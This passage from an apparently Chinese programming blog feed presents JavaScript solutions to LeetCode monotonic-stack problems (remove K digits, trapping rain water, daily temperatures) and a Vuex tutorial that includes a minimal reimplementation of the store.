<span class="token number">4</span> 的组合。这个问题可以用贪心算法来解决。上述规则阐明了我们如何接近最终答案的基本逻辑。一旦我们从序列中删除一个数字，剩下的数字就形成了一个新的问题，我们可以继续使用这个规则。</code></pre><ul><li>思路：从左向右遍历入栈，若下一个数更小，则上一个数出栈。</li><li>问题： num 是一个增序序列，则不会出栈；是一个降序序列，则会一直出栈。</li><li><p>解决：</p><ul><li>每次丢弃一次，k 减去 1。当 k 减到 0 ，我们可以提前终止遍历。</li><li>而当遍历完成，如果 k 仍然大于 0。不妨假设最终还剩下 x 个需要丢弃，那么我们需要选择删除末尾 x 个元素。</li></ul></li><li><p>若输入为(“1234567890”, 9)，按照以上逻辑最后输出的 stack 为 [1,2,3,4,5,6,7,8,0]，所以要设置 while 循环，当 num[i] 一直比栈顶元素小时，则继续出栈</p></li><li>保证数字范围使用 BigInt</li><li>若 num.length === k，说明全部删除，直接返回 “0”</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">removeKdigits</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> k    <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">.</span>length <span class="token operator">===</span> k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"0"</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;&amp;</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            n<span class="token operator">--</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> num<span class="token punctuation">.</span>length <span class="token operator">-</span> k<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h2><ul><li><a href="https://leetcode-cn.com/problems/trapping-rain-water/" target="_blank" rel="noopener">leetcode42</a></li><li><a href="https://leetcode-cn.com/problems/trapping-rain-water/solution/trapping-rain-water-by-ikaruga/" target="_blank" rel="noopener">题解1</a>，<a href="https://leetcode-cn.com/problems/trapping-rain-water/solution/dan-diao-zhan-jie-jue-jie-yu-shui-wen-ti-by-sweeti/" target="_blank" rel="noopener">题解2</a></li></ul><pre class=" language-js"><code class="language-js">输入：height <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出：<span class="token number">6</span>解释：上面是由数组 <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> 表示的高度图，在这种情况下，可以接 <span class="token number">6</span> 个单位的雨水（蓝色部分表示雨水）。 </code></pre><ul><li>数据结构：单调栈</li><li>当后面的柱子高度比前面的低时，是无法接雨水的，当找到一根比前面高的柱子，就可以计算接到的雨水，所以使用单调递减栈</li><li>当出现高于栈顶的柱子时，说明可以对前面的柱子结算了，计算已经到手的雨水，然后出栈前面更低的柱子</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> trap <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>height <span class="token operator">||</span> height<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> height<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> height<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> tmp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            res <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>height<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> height<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="每日温度"><a href="#每日温度" class="headerlink" title="每日温度"></a>每日温度</h2><ul><li><a href="https://leetcode-cn.com/problems/daily-temperatures/" target="_blank" rel="noopener">leetcode739</a></li></ul><pre class=" language-js"><code class="language-js">请根据每日 气温 列表，重新生成一个列表。对应位置的输出为：要想观测到更高的气温，至少需要等待的天数。如果气温在这之后都不会升高，请在该位置用 <span class="token number">0</span> 来代替。例如，给定一个列表 temperatures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span>，你的输出应该是 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>。提示：气温 列表长度的范围是 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">]</span>。每个气温的值的均为华氏度，都是在 <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span> 范围内的整数。</code></pre><h3 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> dailyTemperatures <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> T<span class="token punctuation">.</span>length    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> T<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> j            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h3><ul><li>维护单调递减栈，一旦入栈元素大于栈顶元素，则 pop，并记录索引的差值</li><li><a href="https://leetcode-cn.com/problems/daily-temperatures/solution/tu-jie-suan-fa-739mei-ri-wen-du-javascriptjie-ti-b/" target="_blank" rel="noopener">图示</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> dailyTemperatures <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> T<span class="token punctuation">.</span>length    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> T<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span>            stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vuex</title>
      <link href="2020/10/22/Vue-Vuex/"/>
      <url>2020/10/22/Vue-Vuex/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是 Vuex</li><li>核心概念</li><li>vue-devtools</li><li>模拟 Vuex</li></ul><h2 id="什么是-Vuex"><a href="#什么是-Vuex" class="headerlink" title="什么是 Vuex"></a>什么是 Vuex</h2><ul><li>Vuex 是专门为 Vue.js 设计的状态管理库</li><li>它采用集中式的方式存储需要共享的数据</li><li>从使用角度，它就是一个 JavaScript 库</li><li>它的作用是进行状态管理，解决复杂组件通信，数据共享</li><li>如果不打算开发大型单页应用，使用 Vuex 可能是繁琐冗余的。</li><li><a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">官网</a></li></ul><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><p>每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的<strong>状态 (state)</strong>。Vuex 和单纯的全局对象有以下两点不同：</p><ol><li>Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</li><li>你不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地<strong>提交 (commit) mutation</strong>。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  state<span class="token punctuation">:</span> <span class="token punctuation">{</span>    count<span class="token punctuation">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>    increment <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token punctuation">.</span>count<span class="token operator">++</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li><p>State：<strong>单一状态树</strong>，用一个对象就包含了全部的应用层级状态。它作为一个“唯一数据源”而存在。</p></li><li><p>Getter：Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。</p></li><li><p>Mutation：更改 Vuex 的 store 中的状态的唯一方法是提交 mutation</p><ul><li><p>你可以向 <code>store.commit</code> 传入额外的参数，即 mutation 的 <strong>载荷（payload）</strong>：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// ...</span>mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>  increment <span class="token punctuation">(</span>state<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    state<span class="token punctuation">.</span>count <span class="token operator">+</span><span class="token operator">=</span> n  <span class="token punctuation">}</span><span class="token punctuation">}</span>store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'increment'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></code></pre></li><li><p>使用常量替代 mutation 事件类型在各种 Flux 实现中是很常见的模式。这样可以使 linter 之类的工具发挥作用，同时把这些常量放在单独的文件中可以让你的代码合作者对整个 app 包含的 mutation 一目了然：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// mutation-types.js</span><span class="token keyword">export</span> <span class="token keyword">const</span> SOME_MUTATION <span class="token operator">=</span> <span class="token string">'SOME_MUTATION'</span><span class="token comment" spellcheck="true">// store.js</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> SOME_MUTATION <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./mutation-types'</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  state<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 我们可以使用 ES2015 风格的计算属性命名功能来使用一个常量作为函数名</span>    <span class="token punctuation">[</span>SOME_MUTATION<span class="token punctuation">]</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// mutate state</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// JavaScript语言定义对象的属性，有两种方法</span><span class="token comment" spellcheck="true">// 方法一</span>obj<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 方法二</span>obj<span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">+</span> <span class="token string">'bc'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span></code></pre></li></ul></li><li><p>Action：Action 类似于 mutation，不同在于：</p><ul><li><p>Action 提交的是 mutation，而不是直接变更状态。</p></li><li><p>Action 可以包含任意异步操作。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  state<span class="token punctuation">:</span> <span class="token punctuation">{</span>    count<span class="token punctuation">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>    increment <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token punctuation">.</span>count<span class="token operator">++</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  actions<span class="token punctuation">:</span> <span class="token punctuation">{</span>    increment <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>      context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'increment'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li><p>Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此你可以调用 <code>context.commit</code> 提交一个 mutation，或者通过 <code>context.state</code> 和 <code>context.getters</code> 来获取 state 和 getters。实践中，我们会经常用到 ES2015 的 <a href="https://github.com/lukehoban/es6features#destructuring" target="_blank" rel="noopener">参数解构</a> 来简化代码（特别是我们需要调用 <code>commit</code> 很多次的时候）</p><pre class=" language-js"><code class="language-js">actions<span class="token punctuation">:</span> <span class="token punctuation">{</span>  increment <span class="token punctuation">(</span><span class="token punctuation">{</span> commit <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'increment'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>Actions 支持同样的载荷方式和对象方式进行分发：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 以载荷形式分发</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'incrementAsync'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  amount<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 以对象形式分发</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  type<span class="token punctuation">:</span> <span class="token string">'incrementAsync'</span><span class="token punctuation">,</span>  amount<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>Module：由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p><ul><li>为了解决以上问题，Vuex 允许我们将 store 分割成<strong>模块（module）</strong>。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割</li></ul></li><li><p>具体使用请看<a href="https://vuex.vuejs.org/zh/guide/state.html" target="_blank" rel="noopener">官方文档</a></p></li></ul><h2 id="vue-devtools"><a href="#vue-devtools" class="headerlink" title="vue-devtools"></a>vue-devtools</h2><p>vue-devtools是一款基于chrome浏览器的插件,用于vue应用的调试,帮助我们快速的调试开发vue应用</p><h2 id="模拟-Vuex"><a href="#模拟-Vuex" class="headerlink" title="模拟 Vuex"></a>模拟 Vuex</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> _Vue <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">class</span> <span class="token class-name">Store</span> <span class="token punctuation">{</span>  constructor <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>      state <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      getters <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      mutations <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      actions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token operator">=</span> options    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> _Vue<span class="token punctuation">.</span><span class="token function">observable</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>getters <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>getters<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>key <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>getters<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> getters<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_mutations <span class="token operator">=</span> mutations    <span class="token keyword">this</span><span class="token punctuation">.</span>_actions <span class="token operator">=</span> actions  <span class="token punctuation">}</span>  commit <span class="token punctuation">(</span>type<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_mutations<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  dispatch <span class="token punctuation">(</span>type<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_actions<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> install <span class="token punctuation">(</span>Vue<span class="token punctuation">)</span> <span class="token punctuation">{</span>  _Vue <span class="token operator">=</span> Vue  _Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    beforeCreate <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>store<span class="token punctuation">)</span> <span class="token punctuation">{</span>        _Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$store <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>store      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  Store<span class="token punctuation">,</span>  install<span class="token punctuation">}</span></code></pre><ul><li>测试</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'../myvuex'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  state<span class="token punctuation">:</span> <span class="token punctuation">{</span>    count<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    msg<span class="token punctuation">:</span> <span class="token string">'Hello World'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  getters<span class="token punctuation">:</span> <span class="token punctuation">{</span>    reverseMsg <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> state<span class="token punctuation">.</span>msg<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>    increate <span class="token punctuation">(</span>state<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token 